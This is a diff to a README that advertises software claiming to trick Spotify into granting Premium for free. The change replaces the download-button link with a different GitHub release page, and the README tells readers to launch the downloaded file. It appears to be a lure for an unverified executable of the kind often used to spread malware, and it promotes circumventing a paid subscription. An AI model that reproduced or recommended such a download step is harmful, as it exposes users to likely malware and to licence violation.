@@ -23,7 +23,7 @@ This software is designed to trick Spotify into thinking you have a Premium subs
 ## Get Started
 To download the software, click the button below: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ayyanshahid/Spotify-Premium-for-free-2024/releases/tag/v2.0)](https://github.com/ayyanshahid/Spotify-Premium-for-free-2024/releases/tag/v2.0)
 
 **Note:** Click the button above to download the software. Make sure to launch the file once it's downloaded.
 
